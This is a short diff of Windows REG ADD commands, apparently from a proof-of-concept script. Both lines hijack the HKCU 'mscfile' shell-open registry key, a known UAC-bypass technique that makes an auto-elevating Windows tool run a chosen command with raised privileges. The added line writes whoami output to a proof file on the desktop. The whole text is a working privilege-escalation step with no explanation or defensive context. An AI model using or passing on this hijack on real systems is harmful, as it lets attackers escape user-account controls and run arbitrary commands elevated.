@@ -1,4 +1,5 @@
 REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "cmd.exe /k whoami /groups" /f
+REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "cmd.exe /c whoami > C:\Users\IEUser\Desktop\proof.txt" /f
 
 
 
